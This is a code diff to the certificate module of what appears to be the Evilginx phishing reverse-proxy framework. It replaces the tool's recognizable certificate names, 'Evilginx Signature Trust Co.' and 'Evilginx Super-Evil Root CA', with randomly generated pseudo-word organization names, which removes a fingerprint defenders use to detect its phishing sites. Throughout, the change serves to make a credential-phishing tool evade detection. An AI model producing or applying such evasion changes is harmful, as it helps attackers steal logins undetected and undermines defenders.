@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"math/big"
+	mrand "math/rand"
 	"os"
 	"path/filepath"
 	"strings"
@@ -29,6 +30,8 @@ type CertDb struct {
 	caCert    tls.Certificate
 	tlsCache  map[string]*tls.Certificate
 }
+
+var organization string = generateRandomWord() + " " + generateRandomWord() + " " + generateRandomWord()
 
 func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
 	os.Setenv("XDG_DATA_HOME", cache_dir)
@@ -129,9 +132,9 @@ func (o *CertDb) generateCertificates() error {
 			Subject: pkix.Name{
 				Country:            []string{},
 				Locality:           []string{},
-				Organization:       []string{"Evilginx Signature Trust Co."},
+				Organization:       []string{organization + " Co"},
 				OrganizationalUnit: []string{},
-				CommonName:         "Evilginx Super-Evil Root CA",
+				CommonName:         organization + " CA",
 			},
 			NotBefore:             notBefore,
 			NotAfter:              notAfter,
@@ -293,7 +296,7 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 		template = x509.Certificate{
 			SerialNumber:          serialNumber,
 			Issuer:                x509ca.Subject,
-			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
+			Subject:               pkix.Name{Organization: []string{organization + " Co"}},
 			NotBefore:             time.Now(),
 			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
 			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
@@ -346,4 +349,30 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 
 	o.tlsCache[host] = cert
 	return cert, nil
+}
+
+func generateRandomWord() string {
+	vowels := "aeiou"
+	consonants := "bcdfghjklmnpqrstvwxyz"
+
+	mrand.Seed(time.Now().UnixNano())
+
+	syllables := mrand.Intn(3) + 2 // Generate 2 to 4 syllables
+	word := ""
+
+	for i := 0; i < syllables; i++ {
+		// Generate random consonant and vowel pair
+		consonant := string(consonants[mrand.Intn(len(consonants))])
+		vowel := string(vowels[mrand.Intn(len(vowels))])
+
+		// Capitalize the first character of the pair
+		if i == 0 {
+			word += strings.ToUpper(consonant)
+		} else {
+			word += consonant
+		}
+		word += vowel
+	}
+
+	return word
 }
